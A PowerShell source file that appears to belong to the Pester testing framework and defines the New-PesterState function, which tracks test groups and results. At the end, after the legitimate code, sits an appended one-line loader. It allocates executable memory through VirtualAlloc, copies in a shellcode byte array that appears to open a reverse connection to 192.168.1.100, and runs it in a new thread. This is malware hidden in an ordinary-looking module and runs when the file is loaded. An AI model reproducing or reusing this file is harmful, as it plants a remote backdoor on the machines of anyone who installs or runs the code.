function New-PesterState {
    param (
        [String[]]$TagFilter,
        [String[]]$ExcludeTagFilter,
        [String[]]$TestNameFilter,
        [System.Management.Automation.SessionState]$SessionState,
        [Switch]$Strict,
        [Pester.OutputTypes]$Show = 'All',
        [object]$PesterOption,
        [Switch]$RunningViaInvokePester,
        [Hashtable[]] $ScriptBlockFilter
    )

    if ($null -eq $SessionState) {
        $SessionState = Set-SessionStateHint -PassThru  -Hint "Module - Pester (captured in New-PesterState)" -SessionState $ExecutionContext.SessionState
    }

    if ($null -eq $PesterOption) {
        $PesterOption = New-PesterOption
    }
    elseif ($PesterOption -is [System.Collections.IDictionary]) {
        try {
            $PesterOption = New-PesterOption @PesterOption
        }
        catch {
            throw
        }
    }

    & $SafeCommands['New-Module'] -Name PesterState -AsCustomObject -ArgumentList $TagFilter, $ExcludeTagFilter, $TestNameFilter, $SessionState, $Strict, $Show, $PesterOption, $RunningViaInvokePester -ScriptBlock {
        param (
            [String[]]$_tagFilter,
            [String[]]$_excludeTagFilter,
            [String[]]$_testNameFilter,
            [System.Management.Automation.SessionState]$_sessionState,
            [Switch]$Strict,
            [Pester.OutputTypes]$Show,
            [object]$PesterOption,
            [Switch]$RunningViaInvokePester
        )

        
        $TagFilter = $_tagFilter
        $ExcludeTagFilter = $_excludeTagFilter
        $TestNameFilter = $_testNameFilter


        $script:SessionState = $_sessionState
        $script:Stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
        $script:TestStartTime = $null
        $script:TestStopTime = $null
        $script:CommandCoverage = @()
        $script:Strict = $Strict
        $script:Show = $Show
        $script:InTest = $false

        $script:TestResult = @()

        $script:TotalCount = 0
        $script:Time = [timespan]0
        $script:PassedCount = 0
        $script:FailedCount = 0
        $script:SkippedCount = 0
        $script:PendingCount = 0
        $script:InconclusiveCount = 0

        $script:IncludeVSCodeMarker = $PesterOption.IncludeVSCodeMarker
        $script:TestSuiteName = $PesterOption.TestSuiteName
        $script:ScriptBlockFilter = $PesterOption.ScriptBlockFilter
        $script:RunningViaInvokePester = $RunningViaInvokePester

        $script:SafeCommands = @{}

        $script:SafeCommands['New-Object'] = & (Pester\SafeGetCommand) -Name New-Object          -Module Microsoft.PowerShell.Utility -CommandType Cmdlet
        $script:SafeCommands['Select-Object'] = & (Pester\SafeGetCommand) -Name Select-Object       -Module Microsoft.PowerShell.Utility -CommandType Cmdlet
        $script:SafeCommands['Export-ModuleMember'] = & (Pester\SafeGetCommand) -Name Export-ModuleMember -Module Microsoft.PowerShell.Core    -CommandType Cmdlet
        $script:SafeCommands['Add-Member'] = & (Pester\SafeGetCommand) -Name Add-Member          -Module Microsoft.PowerShell.Utility -CommandType Cmdlet

        function New-TestGroup([string] $Name, [string] $Hint) {
            & $SafeCommands['New-Object'] psobject -Property @{
                Name              = $Name
                Type              = 'TestGroup'
                Hint              = $Hint
                Actions           = [System.Collections.ArrayList]@()
                BeforeEach        = & $SafeCommands['New-Object'] System.Collections.Generic.List[scriptblock]
                AfterEach         = & $SafeCommands['New-Object'] System.Collections.Generic.List[scriptblock]
                BeforeAll         = & $SafeCommands['New-Object'] System.Collections.Generic.List[scriptblock]
                AfterAll          = & $SafeCommands['New-Object'] System.Collections.Generic.List[scriptblock]
                TotalCount        = 0
                StartTime         = $Null
                Time              = [timespan]0
                PassedCount       = 0
                FailedCount       = 0
                SkippedCount      = 0
                PendingCount      = 0
                InconclusiveCount = 0
            }
        }

        $script:TestActions = New-TestGroup -Name Pester -Hint Root
        $script:TestGroupStack = & $SafeCommands['New-Object'] System.Collections.Stack
        $script:TestGroupStack.Push($script:TestActions)

        function EnterTestGroup([string] $Name, [string] $Hint) {
            $newGroup = New-TestGroup @PSBoundParameters
            $newGroup.StartTime = $script:Stopwatch.Elapsed
            $null = $script:TestGroupStack.Peek().Actions.Add($newGroup)

            $script:TestGroupStack.Push($newGroup)
        }

        function LeaveTestGroup([string] $Name, [string] $Hint) {
            $StopTime = $script:Stopwatch.Elapsed
            $currentGroup = $script:TestGroupStack.Pop()

            if ( $Hint -eq 'Script' ) {
                $script:Time += $StopTime - $currentGroup.StartTime
            }

            $currentGroup.Time = $StopTime - $currentGroup.StartTime

            
            $currentGroup.PSObject.properties.remove('StartTime')

            if ($currentGroup.Name -ne $Name -or $currentGroup.Hint -ne $Hint) {
                throw "TestGroups stack corrupted:  Expected name/hint of '$Name','$Hint'.  Found '$($currentGroup.Name)', '$($currentGroup.Hint)'."
            }
        }

        function AddTestResult {
            param (
                [string]$Name,
                [ValidateSet("Failed", "Passed", "Skipped", "Pending", "Inconclusive")]
                [string]$Result,
                [Nullable[TimeSpan]]$Time,
                [string]$FailureMessage,
                [string]$StackTrace,
                [string] $ParameterizedSuiteName,
                [System.Collections.IDictionary] $Parameters,
                [System.Management.Automation.ErrorRecord] $ErrorRecord
            )

            
            function New-ErrorRecord ([string] $Message, [string] $ErrorId, [string] $File, [string] $Line, [string] $LineText) {
                $exception = & $SafeCommands['New-Object'] Exception $Message
                $errorCategory = [Management.Automation.ErrorCategory]::InvalidResult
                
                $targetObject = @{Message = $Message; File = $File; Line = $Line; LineText = $LineText}
                $errorRecord = & $SafeCommands['New-Object'] Management.Automation.ErrorRecord $exception, $ErrorID, $errorCategory, $targetObject
                return $errorRecord
            }

            if ($null -eq $Time) {
                if ( $script:TestStartTime -and $script:TestStopTime ) {
                    $Time = $script:TestStopTime - $script:TestStartTime
                    $script:TestStartTime = $null
                    $script:TestStopTime = [timespan]0
                }
                else {
                    $Time = [timespan]0
                }
            }

            if (-not $script:Strict) {
                $Passed = "Passed", "Skipped", "Pending" -contains $Result
            }
            else {
                $Passed = $Result -eq "Passed"
                if (@("Skipped", "Pending", "Inconclusive") -contains $Result) {
                    $FailureMessage = "The test failed because the test was executed in Strict mode and the result '$result' was translated to Failed."
                    $ErrorRecord = New-ErrorRecord -ErrorId "PesterTest$Result" -Message $FailureMessage
                    $Result = "Failed"
                }

            }

            $script:TotalCount++

            switch ($Result) {
                Passed {
                    $script:PassedCount++; break;
                }
                Failed {
                    $script:FailedCount++; break;
                }
                Skipped {
                    $script:SkippedCount++; break;
                }
                Pending {
                    $script:PendingCount++; break;
                }
                Inconclusive {
                    $script:InconclusiveCount++; break;
                }
            }

            $resultRecord = & $SafeCommands['New-Object'] -TypeName PsObject -Property @{
                Name                   = $Name
                Type                   = 'TestCase'
                Passed                 = $Passed
                Result                 = $Result
                Time                   = $Time
                FailureMessage         = $FailureMessage
                StackTrace             = $StackTrace
                ErrorRecord            = $ErrorRecord
                ParameterizedSuiteName = $ParameterizedSuiteName
                Parameters             = $Parameters
                Show                   = $script:Show
            }

            $null = $script:TestGroupStack.Peek().Actions.Add($resultRecord)

            
            $describe = ''
            $contexts = [System.Collections.ArrayList]@()

            
            $reversedStack = $script:TestGroupStack.ToArray()
            [array]::Reverse($reversedStack)

            foreach ($group in $reversedStack) {
                if ($group.Hint -eq 'Root' -or $group.Hint -eq 'Script') {
                    continue
                }
                if ($describe -eq '') {
                    $describe = $group.Name
                }
                else {
                    $null = $contexts.Add($group.Name)
                }
            }

            $context = $contexts -join '\'

            $script:TestResult += & $SafeCommands['New-Object'] psobject -Property @{
                Describe               = $describe
                Context                = $context
                Name                   = $Name
                Passed                 = $Passed
                Result                 = $Result
                Time                   = $Time
                FailureMessage         = $FailureMessage
                StackTrace             = $StackTrace
                ErrorRecord            = $ErrorRecord
                ParameterizedSuiteName = $ParameterizedSuiteName
                Parameters             = $Parameters
                Show                   = $script:Show
            }
        }

        function AddSetupOrTeardownBlock([scriptblock] $ScriptBlock, [string] $CommandName) {
            $currentGroup = $script:TestGroupStack.Peek()

            $isSetupCommand = IsSetupCommand -CommandName $CommandName
            $isGroupCommand = IsTestGroupCommand -CommandName $CommandName

            if ($isSetupCommand) {
                if ($isGroupCommand) {
                    $currentGroup.BeforeAll.Add($ScriptBlock)
                }
                else {
                    $currentGroup.BeforeEach.Add($ScriptBlock)
                }
            }
            else {
                if ($isGroupCommand) {
                    $currentGroup.AfterAll.Add($ScriptBlock)
                }
                else {
                    $currentGroup.AfterEach.Add($ScriptBlock)
                }
            }
        }

        function IsSetupCommand {
            param ([string] $CommandName)
            return $CommandName -eq 'BeforeEach' -or $CommandName -eq 'BeforeAll'
        }

        function IsTestGroupCommand {
            param ([string] $CommandName)
            return $CommandName -eq 'BeforeAll' -or $CommandName -eq 'AfterAll'
        }

        function GetTestCaseSetupBlocks {
            $blocks = @(
                foreach ($group in $this.TestGroups) {
                    $group.BeforeEach
                }
            )

            return $blocks
        }

        function GetTestCaseTeardownBlocks {
            $groups = @($this.TestGroups)
            [Array]::Reverse($groups)

            $blocks = @(
                foreach ($group in $groups) {
                    $group.AfterEach
                }
            )

            return $blocks
        }

        function GetCurrentTestGroupSetupBlocks {
            return $script:TestGroupStack.Peek().BeforeAll
        }

        function GetCurrentTestGroupTeardownBlocks {
            return $script:TestGroupStack.Peek().AfterAll
        }

        function EnterTest {
            if ($script:InTest) {
                throw 'You are already in a test case.'
            }

            $script:TestStartTime = $script:Stopwatch.Elapsed
            $script:InTest = $true
        }

        function LeaveTest {
            $script:TestStopTime = $script:Stopwatch.Elapsed
            $script:InTest = $false
        }

        $ExportedVariables = "TagFilter",
        "ExcludeTagFilter",
        "TestNameFilter",
        "ScriptBlockFilter",
        "TestResult",
        "SessionState",
        "CommandCoverage",
        "Strict",
        "Show",
        "Time",
        "TotalCount",
        "PassedCount",
        "FailedCount",
        "SkippedCount",
        "PendingCount",
        "InconclusiveCount",
        "IncludeVSCodeMarker",
        "TestActions",
        "TestGroupStack",
        "TestSuiteName",
        "InTest",
        "RunningViaInvokePester"

        $ExportedFunctions = "EnterTestGroup",
        "LeaveTestGroup",
        "AddTestResult",
        "AddSetupOrTeardownBlock",
        "GetTestCaseSetupBlocks",
        "GetTestCaseTeardownBlocks",
        "GetCurrentTestGroupSetupBlocks",
        "GetCurrentTestGroupTeardownBlocks",
        "EnterTest",
        "LeaveTest"

        & $SafeCommands['Export-ModuleMember'] -Variable $ExportedVariables -function $ExportedFunctions
    }  |
        & $SafeCommands['Add-Member'] -PassThru -MemberType ScriptProperty -Name CurrentTestGroup -Value {
        $this.TestGroupStack.Peek()
    } |
        & $SafeCommands['Add-Member'] -PassThru -MemberType ScriptProperty -Name TestGroups -Value {
        $array = $this.TestGroupStack.ToArray()
        [Array]::Reverse($array)
        return $array
    } |
        & $SafeCommands['Add-Member'] -PassThru -MemberType ScriptProperty -Name IndentLevel -Value {
        
        return [Math]::Max(0, $this.TestGroupStack.Count - 2)
    }
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x64,0x68,0x02,0x00,0x07,0xe4,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

